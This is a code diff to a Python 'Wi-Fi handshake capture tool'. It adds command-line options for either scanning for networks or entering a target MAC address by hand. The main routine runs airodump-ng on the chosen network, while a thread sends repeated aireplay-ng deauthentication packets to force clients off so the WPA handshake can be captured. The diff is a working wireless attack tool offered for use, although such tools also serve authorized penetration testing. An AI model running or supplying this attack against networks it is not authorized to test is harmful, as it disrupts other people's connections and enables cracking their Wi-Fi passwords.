@@ -5,6 +5,7 @@ import os
 import signal
 import time
 import threading
+import argparse
 from colorama import Fore
 
 os.system('clear')
@@ -106,47 +107,70 @@ def execute_command(command):
     return duration
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Wi-Fi handshake capture tool')
+    parser.add_argument('interface', type=str, help='Wireless interface to use (e.g., wlan0)')
+    parser.add_argument('-scan', action='store_true', help='Scan for available networks')
+    parser.add_argument('-n', type=str, metavar='MAC_ADDRESS', help='Specify target MAC address manually')
+
+    args = parser.parse_args()
+
+    interface = args.interface
+
     try:
-        interface = input("Enter the wireless interface (default: " + Fore.LIGHTBLUE_EX + "wlan0" + Fore.RESET + "): " + Fore.RESET) or "wlan0"
-        subprocess.run('monitormode -stop', shell=True, stdout=open(os.devnull, 'wb'))
-        networks = get_wifi_networks(interface)
-        if networks:
-            display_networks(networks)
-            selected_network = select_target_network(networks)
-            
-            target_essid = selected_network['SSID']
-            target_bssid = selected_network['MAC Address']
-            target_channel = selected_network['Channel']
-            target_encryption = selected_network['Encryption']
-            target_signal_strength = selected_network['Signal Strength']
-            
-            os.system('clear')
-            print("\nTarget Network Selected:")
-            print(Fore.LIGHTBLUE_EX + "Name: " + Fore.YELLOW + str(target_essid) + Fore.RESET)
-            print(Fore.LIGHTBLUE_EX + "Mac Address: " + Fore.YELLOW + str(target_bssid) + Fore.RESET)
-            print(Fore.LIGHTBLUE_EX + "Channel: " + Fore.YELLOW + str(target_channel) + Fore.RESET)
-            print(Fore.LIGHTBLUE_EX + "Encryption: " + Fore.YELLOW + str(target_encryption) + Fore.RESET)
-            print(Fore.LIGHTBLUE_EX + "Signal Strength: " + Fore.YELLOW + str(target_signal_strength) + Fore.RESET + '\n')
 
-            subprocess.run('monitormode -start', shell=True, stdout=open(os.devnull, 'wb'))
-            
-            # Start airodump-ng in a separate process
-            airodump_process, output_file = run_airodump(target_essid, target_channel, target_bssid, interface)
-            
-            # Start aireplay-ng in a separate thread with cyclic deauth
-            aireplay_thread = AireplayThread(target_bssid, interface)
-            aireplay_thread.start()
+        if args.scan:
+            # Scanning for networks
+            networks = get_wifi_networks(interface)
+            if networks:
+                display_networks(networks)
+                selected_network = select_target_network(networks)
+                
+                target_essid = selected_network['SSID']
+                target_bssid = selected_network['MAC Address']
+                target_channel = selected_network['Channel']
+                target_encryption = selected_network['Encryption']
+                target_signal_strength = selected_network['Signal Strength']
 
-            # Monitor airodump-ng output for handshake capture
-            handshake_detected = monitor_handshake(airodump_process, aireplay_thread, output_file)
+            else:
+                print("No networks found.")
+                exit(1)
+        
+        elif args.n:
+            # Using manual input for network
+            target_bssid = args.n
+            target_essid = input("Enter the ESSID (Network Name): ")
+            target_channel = input("Enter the channel: ")
+            target_encryption = input("Enter the encryption type: ")
+            target_signal_strength = "Unknown"
+        
+        else:
+            print("Error: You must specify either -scan or -n with a MAC address.")
+            exit(1)
 
-            # Wait for the airodump-ng process to finish
-            airodump_process.wait()
+        os.system('clear')
+        print("\nTarget Network Selected:")
+        print(Fore.LIGHTBLUE_EX + "Name: " + Fore.YELLOW + str(target_essid) + Fore.RESET)
+        print(Fore.LIGHTBLUE_EX + "Mac Address: " + Fore.YELLOW + str(target_bssid) + Fore.RESET)
+        print(Fore.LIGHTBLUE_EX + "Channel: " + Fore.YELLOW + str(target_channel) + Fore.RESET)
+        print(Fore.LIGHTBLUE_EX + "Encryption: " + Fore.YELLOW + str(target_encryption) + Fore.RESET)
+        print(Fore.LIGHTBLUE_EX + "Signal Strength: " + Fore.YELLOW + str(target_signal_strength) + Fore.RESET + '\n')
+        
+        # Start airodump-ng in a separate process
+        airodump_process, output_file = run_airodump(target_essid, target_channel, target_bssid, interface)
+        
+        # Start aireplay-ng in a separate thread with cyclic deauth
+        aireplay_thread = AireplayThread(target_bssid, interface)
+        aireplay_thread.start()
 
-            # Clean up
-            aireplay_thread.stop()
-            aireplay_thread.join()
+        # Monitor airodump-ng output for handshake capture
+        handshake_detected = monitor_handshake(airodump_process, aireplay_thread, output_file)
+
+        # Wait for the airodump-ng process to finish
+        airodump_process.wait()
+
+        # Clean up
+        aireplay_thread.stop()
+        aireplay_thread.join()
 
     except KeyboardInterrupt:
         print("\nProgram interrupted. Cleaning up and exiting...")
-        subprocess.run('monitormode -stop', shell=True, stdout=open(os.devnull, 'wb'))
